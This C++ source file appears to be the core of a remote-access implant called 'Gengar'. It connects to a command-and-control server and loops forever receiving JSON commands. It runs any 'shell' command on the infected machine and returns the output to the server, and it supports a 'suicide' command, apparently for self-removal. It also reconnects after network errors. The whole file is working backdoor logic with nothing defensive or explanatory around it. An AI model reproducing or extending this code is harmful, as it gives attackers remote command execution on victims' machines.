#include "gengar.h"

void Gengar::ConnectToCnc() { m_client.Connect(); }

void Gengar::ListenForCommand()
{
	while (true)
	{
		try
		{
			RouteCommand(m_client.Receive());
		}
		catch (boost::system::system_error&)
		{
			ConnectToCnc();
			ListenForCommand();
		}
	}
}

void Gengar::RouteCommand(json cmd)
{
	std::string output;

	if (cmd["type"] == "shell")
		output = m_machine.RunShellCommand(cmd["content"]);
	else if (cmd["type"] == "suicide")
		m_machine.Suicide();
	else
		output = "Unknown command type.";
	m_client.Send(output);
}
